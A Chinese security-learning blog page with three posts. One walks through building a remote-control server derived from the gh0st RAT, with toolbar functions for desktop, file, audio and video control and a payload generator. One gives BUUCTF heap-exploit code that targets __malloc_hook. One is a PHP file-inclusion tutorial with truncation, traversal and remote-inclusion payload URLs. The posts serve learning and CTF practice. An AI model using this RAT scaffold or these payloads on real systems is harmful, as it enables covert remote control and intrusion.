<h2 id="1-8-为对话框添加状态条并在态条上显示文字"><a href="#1-8-为对话框添加状态条并在态条上显示文字" class="headerlink" title="1.8 为对话框添加状态条并在态条上显示文字"></a>1.8 为对话框添加状态条并在态条上显示文字</h2><p>1.创建字符串资源  ID:  IDR_STATUSBAR_STRING</p>
<p><img src="https://s2.loli.net/2022/04/12/n3JocdkfFtDLY28.png"></p>
<p>2.添加状态条变量:</p>
<pre><code>    CStatusBar  m_wndStatusBar;              //状态条</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/5lsGuxqZbKW8HXz.png"></p>
<p>3.查看MSDN:</p>
<pre><code>    CStatusBar  SetIndicators      
                BOOL SetIndicators(           //在状态条中加入对应字符串ID
                      const UINT* lpIDArray,   //字符串ID         
                               int nIDCount     //个数
                );

                void SetPaneInfo(         //设置状态条的显示状态
                              int nIndex,     //状态条的索引
                              UINT&amp; nID,      //状态条的字符ID
                              UINT&amp; nStyle,    //状态条的样式
                               int&amp; cxWidth    //状态条的宽度
                ) const;</code></pre>
<p>4.写入代码创建状态条的代码:</p>
<pre><code>  (1)  创建字符ID的数组
           static UINT indicators[] =
           &#123;
           IDR_STATUSBAR_STRING
               &#125;;
   (2)添加CreatStatusBar函数并写入代码:
        if (!m_wndStatusBar.Create(this) ||
    !m_wndStatusBar.SetIndicators(indicators,
    sizeof(indicators)/sizeof(UINT)))                    //创建状态条并设置字符资源的ID
     &#123;
    TRACE0(&quot;Failed to create status bar\n&quot;);
    return ;      // fail to create
         &#125;
       CRect rc;
       ::GetWindowRect(m_wndStatusBar.m_hWnd,rc);             
       m_wndStatusBar.MoveWindow(rc);                              //移动状态条到指定位置

   (3)在OnSize 中添加代码:
          if(m_wndStatusBar.m_hWnd!=NULL)&#123;    //当对话框大小改变时 状态条大小也随之改变
    CRect rc;
    rc.top=cy-20;
    rc.left=0;
    rc.right=cx;
    rc.bottom=cy;
    m_wndStatusBar.MoveWindow(rc);
    m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
     &#125;</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/8CZcbr5MelhJNmo.png"></p>
<p><img src="https://s2.loli.net/2022/04/12/wirknzpZFV2yejQ.png"></p>
<p>5.写入状态上显示文字的代码:</p>
<pre><code>       .h中添加变量 int iCount

   CString strStatusMsg;
if (strMsg.Find(&quot;上线&quot;)&gt;0)         //处理上线还是下线消息
&#123;
    iCount++;
&#125;else if (strMsg.Find(&quot;下线&quot;)&gt;0)
&#123;
    iCount--;
&#125;else if (strMsg.Find(&quot;断开&quot;)&gt;0)
&#123;
    iCount--;
&#125;
iCount=(iCount&lt;=0?0:iCount);         //防止iCount 有-1的情况
strStatusMsg.Format(&quot;有%d个主机在线&quot;,iCount);
m_wndStatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字</code></pre>
<p>6.列表中添加条目时产生日志:<br>      Addlist 中添加<br>            ShowMessage(true,strIP+”主机上线”);</p>
<p><img src="https://s2.loli.net/2022/04/12/JHmvZsquXLFzoOM.png"></p>
<p><img src="https://s2.loli.net/2022/04/12/JQnEcyTPVWdLghX.png"></p>
<h2 id="1-9-为对话框添加入工具条"><a href="#1-9-为对话框添加入工具条" class="headerlink" title="1.9 为对话框添加入工具条"></a>1.9 为对话框添加入工具条</h2><p>1.创建工具条资源  ID:  IDR_TOOLBAR_MAIN<br>添加 IDR_TOOLBAR_MAIN 时 修改大小</p>
<pre><code>              共12个工具条  9+3</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/JqybaXdp5SKZc7j.png"></p>
<p>2.添加BMP资源:</p>
<p>图片格式需要为bmp图片，在bitmap中导入资源</p>
<pre><code>             ID:  IDB_BITMAP_MAIN</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/jvJunAY8Nyb6xOm.png"></p>
<p>3.复制TrueColorToolBar文件，添加CTrueColorToolBar类.</p>
<p><img src="https://s2.loli.net/2022/04/12/9mDTJvgaurNlhKW.png"></p>
<p>4.添加:</p>
<pre><code>   #include &quot;TrueColorToolBar.h&quot;</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/dKJROn94WU3vCPt.png"></p>
<p>5.声明变量:<br>      CTrueColorToolBar m_ToolBar; </p>
<p><img src="https://s2.loli.net/2022/04/12/lN98XT5uydH6RSV.png"></p>
<p>6.添加CreateToolBar()函数</p>
<p>7.分析CTrueColorToolBar类:</p>
<pre><code>                    继承CToolBar</code></pre>
<p>8.查看MSDN  CToolBar类:</p>
<p>9.CreateToolBar()函数中写入代码:<br>        if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP<br>        | CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||<br>        !m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))<br>    {<br>        TRACE0(“Failed to create toolbar\n”);<br>        return;      // fail to create<br>    }<br>    m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP<br>    m_ToolBar.LoadTrueColorToolBar<br>        (<br>        48,    //加载真彩工具条<br>        IDB_BITMAP_MAIN,<br>        IDB_BITMAP_MAIN,<br>        IDB_BITMAP_MAIN<br>        );<br>    RECT rt,rtMain;<br>    GetWindowRect(&amp;rtMain);<br>    rt.left=0;<br>    rt.top=0;<br>    rt.bottom=80;<br>    rt.right=rtMain.right-rtMain.left+10;<br>    m_ToolBar.MoveWindow(&amp;rt,TRUE);</p>
<pre><code>m_ToolBar.SetButtonText(0,&quot;终端管理&quot;);  
m_ToolBar.SetButtonText(1,&quot;进程管理&quot;); 
m_ToolBar.SetButtonText(2,&quot;窗口管理&quot;); 
m_ToolBar.SetButtonText(3,&quot;桌面管理&quot;); 
m_ToolBar.SetButtonText(4,&quot;文件管理&quot;); 
m_ToolBar.SetButtonText(5,&quot;语音管理&quot;); 
m_ToolBar.SetButtonText(6,&quot;视频管理&quot;); 
m_ToolBar.SetButtonText(7,&quot;服务管理&quot;); 
m_ToolBar.SetButtonText(8,&quot;注册表管理&quot;); 
m_ToolBar.SetButtonText(10,&quot;参数设置&quot;); 
m_ToolBar.SetButtonText(11,&quot;生成服务端&quot;); 
m_ToolBar.SetButtonText(12,&quot;帮助&quot;); 
RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);</code></pre>
<p>10.OnSize中添加代码:<br>        if(m_ToolBar.m_hWnd!=NULL)              //工具条<br>    {<br>        CRect rc;<br>        rc.top=rc.left=0;<br>        rc.right=cx;<br>        rc.bottom=80;<br>        m_ToolBar.MoveWindow(rc);     //设置工具条大小位置<br>    }</p>
<p><img src="https://s2.loli.net/2022/04/12/L4nlZVbR2x1gXeA.png"></p>
<p>11.Oninitdialog 中添加CreateToolBar</p>
<p><img src="https://s2.loli.net/2022/04/12/zdhNXMwyoP6ns2k.png"></p>
<h2 id="1-10-为程序添加系统托盘"><a href="#1-10-为程序添加系统托盘" class="headerlink" title="1.10 为程序添加系统托盘"></a>1.10 为程序添加系统托盘</h2><p>1.创建菜单资源<br>                ID:  IDR_MENU_NOTIFY<br>                添加子菜单  显示  IDM_NOTIFY_SHOW<br>                            退出  IDM_NOTIFY_CLOSE</p>
<p><img src="https://s2.loli.net/2022/04/12/wLs1qh7MbUpIN3v.png"></p>
<p>2.认识一个API</p>
<pre><code>    Shell_NotifyIcon
     BOOL Shell_NotifyIcon(                    //向系统托盘中加入图标
                       DWORD dwMessage,         //状态           
                       PNOTIFYICONDATA lpdata   //含有图标  消息响应 的一个结构体
     );</code></pre>
<p> 3.认识NOTIFYICONDATA  结构体:</p>
<pre><code>       typedef struct _NOTIFYICONDATA &#123;
DWORD cbSize;       //结构体自身大小
HWND hWnd;          //托盘的父窗口  托盘发出的消息由哪一个窗口响应
UINT uID;           //显示图标的ID
UINT uFlags;         //托盘的状态 (如有图标，有气泡提示，有消息响应等)
UINT uCallbackMessage; //托盘事件的消息响应函数
HICON hIcon;            //图标的变量
TCHAR szTip[64];        //气泡的显示文字
DWORD dwState;          //图标的显示状态
DWORD dwStateMask;      //图标的显示状态
TCHAR szInfo[256];      //气泡的显示文字  (可以忽略)
union &#123;
    UINT uTimeout;
    UINT uVersion;
&#125;;
TCHAR szInfoTitle[64];
DWORD dwInfoFlags;
GUID guidItem;
HICON hBalloonIcon;
    &#125; NOTIFYICONDATA, *PNOTIFYICONDATA;</code></pre>
<p>4.在oninitdialog函数中写入加入系统脱盘的代码:</p>
<pre><code>      nid.cbSize = sizeof(nid);     //大小赋值
nid.hWnd = m_hWnd;           //父窗口
nid.uID = IDR_MAINFRAME;     //icon  ID
nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;   //托盘所拥有的状态
nid.uCallbackMessage = UM_ICONNOTIFY;            //回调消息
nid.hIcon = m_hIcon;                            //icon 变量
CString str=&quot;PCRemote远程协助软件.........&quot;;       //气泡提示
lstrcpyn(nid.szTip, (LPCSTR)str, sizeof(nid.szTip) / sizeof(nid.szTip[0]));
Shell_NotifyIcon(NIM_ADD, &amp;nid);   //显示托盘</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/JgPx1KCwdGEmo3U.png"></p>
<p>5.演示 ，在窗口销毁时托盘依然存在</p>
<p>6.添加WM_CLOSE消息并写入代码:</p>
<pre><code>  Shell_NotifyIcon(NIM_DELETE, &amp;nid); //销毁图标</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/isYezB3c72dGWwE.png"></p>
<p>7.stdafx.h文件中加入自定义消息的定义</p>
<pre><code> //自定义消息
enum
&#123;
    UM_ICONNOTIFY= WM_USER+0x100,
&#125;;</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/CBhz1opLE2iDUF7.png"></p>
<p>8.声明消息处理函数:<br>     afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);</p>
<p><img src="https://s2.loli.net/2022/04/12/L3KmbZXthj5IrRU.png"></p>
<ol start="9">
<li> cpp文件中写入代码:</li>
</ol>
<pre><code>       void CPCRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
&#123;
    switch ((UINT)lParam)
    &#123;
    case WM_LBUTTONDOWN: // click or dbclick left button on icon
    case WM_LBUTTONDBLCLK: // should show desktop
        if (!IsWindowVisible()) 
            ShowWindow(SW_SHOW);
        else
            ShowWindow(SW_HIDE);
        break;
    case WM_RBUTTONDOWN: // click right button, show menu
        CMenu menu;
        menu.LoadMenu(IDR_MENU_NOTIFY);
        CPoint point;
        GetCursorPos(&amp;point);
        SetForegroundWindow();
        menu.GetSubMenu(0)-&gt;TrackPopupMenu(
            TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
            point.x, point.y, this, NULL); 
        PostMessage(WM_USER, 0, 0);
        break;
    &#125;
&#125;</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/IO4iAPXxTUgLYCB.png"></p>
<p>10.添加消息响应:</p>
<pre><code>ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify)  </code></pre>
<p><img src="https://s2.loli.net/2022/04/12/v3z8L612QKfTpku.png"></p>
<p>11.添加显示菜单消息响应</p>
<h1 id="二、加入Socket数据传输的内核"><a href="#二、加入Socket数据传输的内核" class="headerlink" title="二、加入Socket数据传输的内核"></a>二、加入Socket数据传输的内核</h1><h2 id="2-3"><a href="#2-3" class="headerlink" title="2.3"></a>2.3</h2><p>1.复制gh0st主控端的include文件夹到我们的工程下。</p>
<p><img src="https://s2.loli.net/2022/04/20/9ICSdqjN5RmcZgL.png"></p>
<p><img src="https://s2.loli.net/2022/04/20/lzQVfowE984BJbW.png"></p>
<p>2.包含复制过来的include 文件夹下的文件。</p>
<p>选择 项目 -&gt; 添加现有项 -&gt; 选择include所有文件</p>
<p><img src="https://s2.loli.net/2022/04/20/g2OZuF6BScCVKoN.png"></p>
<p>3.复制common文件夹到我们的工程的上一层目录下。</p>
<p>4.改变 #include “zlib\zlib.h”  的文件路径#include “......\common\zlib\zlib.h”</p>
<p><img src="https://s2.loli.net/2022/04/20/iIt9UuYgp2Ax1aB.png"></p>
<p>根据本地文件位置修改</p>
<p>5.注释掉//#include “../MainFrm.h”<br>6.添加....\common\zlib\zlib.lib库</p>
<pre><code>属性--&gt;连接器--&gt;输入--&gt;附加依赖项 ..\..\common\zlib\zlib.lib</code></pre>
<p><img src="https://s2.loli.net/2022/04/20/gQID4tXa9S6Mshf.png"></p>
<p>7.忽略特定默认库LIBCMT.lib</p>
<p><img src="https://s2.loli.net/2022/04/20/hYVynA38Iz7mCPX.png"></p>
<p>遇到报错：</p>
<p>在查找预编译头时遇到意外的文件结尾。是否忘记了向源中添加“#include “pch.h””?</p>
<p>解决办法：取消预编译头：</p>
<p>菜单栏，项目 ——&gt; 【项目名称】属性 ——&gt; 配置属性 ——&gt; c/c++  ——&gt; 预编译头</p>
<p><img src="https://s2.loli.net/2022/04/20/dFqcHT6D2S1wAfg.png"></p>
<p>8.编译成功ok…………</p>
<h2 id="2-4加入端口监听功能"><a href="#2-4加入端口监听功能" class="headerlink" title="2.4加入端口监听功能"></a>2.4加入端口监听功能</h2><p>1.分析gh0st监听端口的代码:</p>
<pre><code>         Activate(UINT nPort, UINT nMaxConnections)</code></pre>
<p>2.需要一个回调函数</p>
<pre><code>       NotifyProc</code></pre>
<p>3.复制NotifyProc 代码  去掉多余的代码</p>
<p><img src="https://s2.loli.net/2022/04/20/5Bh8yITvCAW7qDN.png"></p>
<pre><code>void CALLBACK CMFCghostDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
&#123;
    try
    &#123;

        switch (nCode)
        &#123;
        case NC_CLIENT_CONNECT:
            break;
        case NC_CLIENT_DISCONNECT:
            //g_pConnectView-&gt;PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
            break;
        case NC_TRANSMIT:
            break;
        case NC_RECEIVE:
            //ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收
            break;
        case NC_RECEIVE_COMPLETE:
            //ProcessReceiveComplete(pContext);       //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete
            break;
        &#125;
    &#125;
    catch (...) &#123;&#125;
&#125;</code></pre>
<p>添加定义：</p>
<pre><code>CIOCPServer* m_iocpServer = NULL;</code></pre>
<p><img src="https://s2.loli.net/2022/04/20/hoZIsSJyt1gfvaV.png"></p>
<p>4.复制Activate  代码 并处理</p>
<pre><code>void CMFCghostDlg::Activate(UINT nPort, UINT nMaxConnections)
&#123;
    CString        str;
    if (m_iocpServer != NULL)
    &#123;
        m_iocpServer-&gt;Shutdown();
        delete m_iocpServer;

    &#125;
    m_iocpServer = new CIOCPServer;

    ////lang2.1_8
    // 开启IPCP服务器 最大连接  端口     查看NotifyProc回调函数  函数定义
    if (m_iocpServer-&gt;Initialize(NotifyProc, NULL, 100000, nPort))
    &#123;

        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        HOSTENT* host = gethostbyname(hostname);
        if (host != NULL)
        &#123;
            for (int i = 0; ; i++)
            &#123;
                str += inet_ntoa(*(IN_ADDR*)host-&gt;h_addr_list[i]);
                if (host-&gt;h_addr_list[i] + host-&gt;h_length &gt;= host-&gt;h_name)
                    break;
                str += &quot;/&quot;;
            &#125;
        &#125;

        //m_wndStatusBar.SetPaneText(0, str);
        //str.Format(&quot;端口: %d&quot;, nPort);
        //m_wndStatusBar.SetPaneText(2, str);
        str.Format(&quot;监听端口: %d成功&quot;, nPort);
        ShowMessage(true, str);
    &#125;
    else
    &#123;
        //str.Format(&quot;端口%d绑定失败&quot;, nPort);
        //m_wndStatusBar.SetPaneText(0, str);
        //m_wndStatusBar.SetPaneText(2, &quot;端口: 0&quot;);
        str.Format(&quot;监听端口: %d失败&quot;, nPort);
        ShowMessage(false, str);
    &#125;

    //m_wndStatusBar.SetPaneText(3, &quot;连接: 0&quot;);
&#125;
// CPCRemoteDlg 消息处理程序</code></pre>
<p>5.监听后添加日志消息</p>
<pre><code>str.Format(&quot;监听端口: %d成功&quot;, nPort);
ShowMessage(true,str);


//else
str.Format(&quot;监听端口: %d失败&quot;, nPort);
ShowMessage(false,str);</code></pre>
<p><img src="https://s2.loli.net/2022/04/20/24DxP6EzIUTSl3W.png"></p>
<p>6.测试  netstat -an</p>
<p>可以看到2000端口被占用</p>
<h1 id="ps-bmp文件格式"><a href="#ps-bmp文件格式" class="headerlink" title="ps bmp文件格式"></a>ps bmp文件格式</h1><p>1.一个bmp文件由四部分组成:</p>
<pre><code>     struCt tagBITMAPFIlEHEADER

     strut tagBITMAPINFOHEADER

     typedef tagRGBQUAD

     位图数据</code></pre>
<hr>
<h2 id="bmp文件结构解析"><a href="#bmp文件结构解析" class="headerlink" title="bmp文件结构解析"></a>bmp文件结构解析</h2><p>1.<br>typedef struCt tagBITMAPFIlEHEADER</p>
<p>{</p>
<p>WORD bftype；     //BM</p>
<p>DWORD bfsiZe：    //位图文件大小</p>
<p>WORD bfReservedl；  //必须为0</p>
<p>WORD bgReserved2：   //必修为0</p>
<p>DWORD bfoffBits： 图像数据在  文件内的起始地址</p>
<p>}BITMAPFILEHEADER；</p>
<p>2.<br>BITMAPINFOHEADER数据结构用于说明位图的大小，其定义为：</p>
<p>type struct tagBITMAPINFOHEADER</p>
<p>{ </p>
<p>DWORD biSize：   //结构BITMAPINFOHEADER所占用的存储容量，固定值为40</p>
<p>DWORD biWldth；  //给出该BMP文件所描述位图的宽度与高度</p>
<p>DWORD biHeight； //给出该BMP文件所描述位图的宽度与高度</p>
<p>WORD biPlanes： //它代表目标设备的平面数必须为1。</p>
<p>WORD biBitCount：  //它确定每个像素所需要的位数。 当图像为单色时，该字段的取值为1；当图像为16色时，该字段的取值为4；当图像为256 色时，该字段的取值为8；当图像为真彩色时，该字段的取值为24。</p>
<p>DWORD biCOmpression；//它代表bottom—up类型位图的 压缩类型</p>
<p>DWORD biSiZelmage； //给出该BMP 内图像数据占用的空间大小</p>
<p>DWORD biXPelsPerMeter：//它们分别以每米像素数为单位，给出位图目的设备水平以及垂直方向的 分辨率</p>
<p>DWORD biYPelsPerMeter：//它们分别以每米像素数为单位，给出位图目的设备水平以及垂直方向的 分辨率</p>
<p>DWORD biClrUsed；       //给出位图实际使用的颜色表中的 颜色变址数</p>
<p>DWORD biClrlmportant；//它给出位图显示过程中 重要颜色的变址数。</p>
<p>}BITMAPINFOHEADER；</p>
<p>3.调色板数据 </p>
<p>typedef struct tagRGBQUAD</p>
<p>{</p>
<p>BYTE rgbBlue；</p>
<p>BYTE rgbGreen；</p>
<p>BYTE rgbRed； </p>
<p>BYTE rgbReserved；       //它不代表任何意 义，必须取固定值00</p>
<p>}RGBQUAD；</p>
<p>3..  bmp结构还提供了另外一个结构类型   ，看他的成员定义就知道了<br>tyPedef stmCt tagBITMAPINFO </p>
<p>{</p>
<p>BITMAPINFOHEADER bmiHeader：   </p>
<p>RGBQUAD bmiC010ur[1]；</p>
<p>}BITMAPINFO；</p>
<p>4.位图数据<br>   注意位图数据的存放是倒序的 文件的第一行正是图像的最后一行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/04/07/%E8%BF%9C%E6%8E%A7ghost/" data-id="cl1qnjmn80000g8v8aut23gvf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-BUUCTF第二页" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/21/BUUCTF%E7%AC%AC%E4%BA%8C%E9%A1%B5/" class="article-date">
  <time datetime="2022-03-21T15:10:57.539Z" itemprop="datePublished">2022-03-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/21/BUUCTF%E7%AC%AC%E4%BA%8C%E9%A1%B5/">buuctf&amp;&amp;攻防世界</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p>漏洞点在md函数，这里没有限制size长度，所以存在溢出漏洞</p>
<p><img src="https://s2.loli.net/2022/03/21/DfUmhApbrJERMsZ.png"></p>
<p><img src="https://s2.loli.net/2022/03/21/tsyd1DvgqluTnRr.png"></p>
<p>这里指针都被清空了，所以不存在uaf可以使用，但是可以构造出double_free漏洞</p>
<p><img src="https://s2.loli.net/2022/03/21/AvCRUnKzpGwSTab.png"></p>
<p>为了形成double_free，可以让原本chunk[2] -&gt; chunk[1]  溢出修改为  chunk[2] -&gt; chunk[4]</p>
<p>修改前</p>
<p><img src="https://s2.loli.net/2022/03/21/f8LXQ7OFoTZmsV5.png"></p>
<p>修改后</p>
<p><img src="https://s2.loli.net/2022/03/21/vWVLrCot8sRcnDF.png"></p>
<pre><code>for i in range(4):
   ad(0x10)

ad(0x80)
ad(0x10)
rm(1)   #2-&gt;1
rm(2)

payload = b&#39;aaaaaaaa&#39;*3 + p64(0x21) + b&#39;aaaaaaaa&#39;*3 + p64(0x21) +p8(0x80)
md(0,len(payload),payload)

payload = b&#39;bbbbbbbb&#39;*3+p64(0x21)
md(3,len(payload),payload)</code></pre>
<p>再连续申请两个chunk，让程序认为chunk[2] 就是chunk[4] .</p>
<p>重新修改chunk[4]的size,使其恢复正常，可以进入unsortbin，也是为了让top_chunk可以正常寻址。rm(2)，dp(4)即可完成泄露</p>
<pre><code>ad(0x10)
ad(0x10)  #40-&gt;80(2)

payload = b&#39;bbbbbbbb&#39;*3+p64(0x91)
md(3,len(payload),payload)

rm(2)
dp(4)

content = u64(p.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)</code></pre>
<p>为了挟持程序流，我们可以采用修改__malloc_hook的方法。我们可以错位寻找满足size域的位置，作为fake_chunk的位置。修改fastbin的fd,从而让chunk分配到那个位置。最后编辑fake_chunk，让__malloc_hook改为one_gadget</p>
<pre><code>base = content-88-0x10 - libc.sym[&#39;__malloc_hook&#39;]
system = base + libc.sym[&#39;system&#39;]
free = base + libc.sym[&#39;__free_hook&#39;]
malloc = base + libc.sym[&#39;__malloc_hook&#39;]
print(&quot;system&quot;,hex(system))
print(&quot;free&quot;,hex(free))


ad(0x60)

rm(4)
payload = p64(malloc-11)
md(2,len(payload),payload)

#gdb.attach(p)

ad(0x60)
ad(0x60)
li(hex(malloc-11))
#gdb.attach(p)
#pause()


#payload = b&#39;abc&#39;
payload = b&#39;AAAAAAAA&#39;

md(6,len(payload),payload)</code></pre>
<h1 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h1><p>布局好两组chunk，一个用于泄露，另一个用于进行double_free</p>
<pre><code>ad(0x18)#0
ad(0x18)#1
ad(0x88)#2
ad(0x88)#3

ad(0x28)#4
ad(0x28)#5
ad(0x68)#6</code></pre>
<p>利用单字节溢出漏洞修改chunk_1的size包括chunk_2，再free chunk_1这样就可以让chunk_1刚好进入unsortbin，然后ad(size(chunk_1))，切割使得chunk2的位置刚好为剩下的unsortbin，dp(2)即可实现泄露</p>
<pre><code>md(0,34,b&#39;a&#39;*0x18+p8(0xb1))#edit chunk_size
rm(1)
ad(0x18)
dp(2)
gdb.attach(io)
leak = u64(io.recvuntil(&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)
li(hex(leak))
malloc = leak - 88 - 0x10
li(hex(malloc))
ad(0x88) </code></pre>
<p>利用double_free漏洞可以实现fastbin_attack.可以通过vmmap看到这个chunk_8被分配到了__malloc_hook附近</p>
<p><img src="https://s2.loli.net/2022/03/28/wmgLiJnIGrZDaPp.png"></p>
<pre><code>md(4,50,b&#39;a&#39;*0x28+p8(0xa1))

rm(5)    
rm(6)    #6 double_free

ad(0x98) #5

md(5,0x38,b&#39;A&#39;*0x28+p64(0x71)+p64(malloc-11)) #fastbin attack 

ad(0x68) #6
ad(0x68)
md(8,30,b&#39;112233445566778899&#39;)   #woc wei shen me shi 8
li(hex(malloc-11))</code></pre>
<p>当然也可以向前进行double_free</p>
<p>但是首尾chunk都需要是的free</p>
<pre><code>int main(void)
&#123;
    void *ptr1,*ptr2,*ptr3,*ptr4;
    ptr1=malloc(128);//smallbin1
    ptr2=malloc(0x10);//fastbin1
    ptr3=malloc(0x10);//fastbin2
    ptr4=malloc(128);//smallbin2
    malloc(0x10);//防止与top合并
    free(ptr1);         &lt;---------
    *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域
    *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域
    free(ptr4);//unlink进行前向extend &lt;---------
    malloc(0x150);//占位块

&#125;</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/21/BUUCTF%E7%AC%AC%E4%BA%8C%E9%A1%B5/" data-id="cl13rha6s0000gsv83kzb8248" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-03-16T15:39:11.539Z" itemprop="datePublished">2022-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">Web学习 文件包含漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="https://s2.loli.net/2022/03/16/KL4v71fCHs6Vyn3.png"><br><img src="https://s2.loli.net/2022/03/16/5UMa6fRHA1IETeQ.png"></p>
<p>1、文件包含漏洞简介<br>1、1什么是文件包含</p>
<pre><code>     程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数</code></pre>
<p>时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p>
<p>1、2 文件包含漏洞的成因  </p>
<pre><code>         随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包</code></pre>
<p>含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变<br>量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做<br>合理的校验或者校验被绕过就造成了文件包含漏洞。</p>
<p>1、3 PHP中常见包含文件的函数</p>
<p>Ø include( )<br>当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br>进来，发生错误时之给出一个警告，继续向下执行。<br>Ø include_once( )<br>功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次<br>Ø require( )<br>require()与include()的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。<br>Ø require_once( )<br>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p> 几乎所有的脚本语言中都提供文件包含的功能，但文件包含漏洞在 PHP 中<br>居多，而在JSP、ASP、ASP.NET程序中非常少，甚至没有包含漏洞的存在。这</p>
<p>与程序开发人员的水平无关，而问题在于语言设计的弊端。</p>
<p>2.举例说明</p>
<p>2.1</p>
<p>有1.txt文件,并且无限制</p>
<pre><code>&lt;?php
$filename=$_GET[&#39;filename&#39;];
include($filename)
?&gt;</code></pre>
<p>直接访问127.0.0.1，只能显示1.txt的代码。</p>
<p><img src="https://s2.loli.net/2022/03/16/Hrg2JCAbykMcS1R.png"></p>
<p>但是利用文件包含漏洞，就可以运行1.txt的代码</p>
<p><img src="https://s2.loli.net/2022/03/16/UWeKyPVLDvZEbH8.png"></p>
<p>2.2 </p>
<p>1.txt有限制</p>
<pre><code>&lt;?php
$filename=$_GET[&#39;filename&#39;];
include ($filename.&quot; .html&quot; );
?&gt;</code></pre>
<p>指向了文件后缀为html<br>这样1.txt就变成了 1.txt.html 这样没有这个文件，所以会执行失败</p>
<p>那么如何绕过</p>
<p>%00截断:条件: magic quotes gpc = off     php版本&lt;5.3.4</p>
<pre><code>http://127.0.0.1:8080/include.php?filename=1.txt%00</code></pre>
<p><img src="https://s2.loli.net/2022/03/17/ANehVLMsjCRYK15.png"></p>
<p>长度截断:条件: windows，点号需要长于256; linux长于4096</p>
<p>填充垃圾长度，使得.html无法被加上</p>
<p><img src="https://s2.loli.net/2022/03/17/za12Gc4DRge7AWM.png"></p>
<p>2.3跨目录包含</p>
<p><a href="http://1227.0.0.1:8080/include.php?filename=../../1.txt">http://1227.0.0.1:8080/include.php?filename=../../1.txt</a></p>
<p>3.远程包含</p>
<p><img src="https://s2.loli.net/2022/03/17/MQjmFY6Vlc1PDBG.png"></p>
<p>allow_url_include打开时支持远程包含</p>
<p>访问并执行远程文件</p>
<p><img src="https://s2.loli.net/2022/03/17/euKrLOcW6DmSYp9.png"></p>
<p>如果远程文件为后门代码，那么该代码会被执行并被连接</p>
<p>3.2有限制远程包含绕过</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/include.php?filename=http">http://127.0.0.1:8080/include.php?filename=http</a>: / / <a target="_blank" rel="noopener" href="http://www.xiaodi8.com/readme.txt">www.xiaodi8.com/readme.txt</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/include.php?filename=http">http://127.0.0.1:8080/include.php?filename=http</a> :/ / <a target="_blank" rel="noopener" href="http://www.xiaodi8.com/readme.txt%20">www.xiaodi8.com/readme.txt%20</a></p>
